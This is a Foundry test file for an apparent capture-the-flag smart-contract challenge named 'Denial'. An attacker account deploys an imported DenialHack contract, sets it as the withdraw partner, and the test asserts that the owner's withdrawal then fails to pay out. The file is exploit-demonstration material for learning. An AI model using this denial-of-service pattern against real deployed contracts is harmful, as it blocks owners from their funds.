// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import { Denial } from "./Denial.sol";
import { DenialHack, Empty } from "./DenialHack.sol";

contract DenialTest is Test {
    Denial denial;

    address owner = address(0xA9E);
    address h3x0r = vm.addr(1337);

    function setUp() public {
        deal(owner, 10 ether);
        vm.startPrank(owner);
        denial = new Denial();
        address(denial).call{value: 10 ether}("");
        assertEq(address(denial).balance, 10 ether);
        vm.stopPrank();
    }

    function testDenialHack() public {
        vm.startPrank(h3x0r);
        DenialHack hack = new DenialHack(payable(address(denial)));
        denial.setWithdrawPartner(address(hack));
        vm.stopPrank();

        vm.prank(owner);
        denial.withdraw();

        assertEq(owner.balance, 0);
    }
}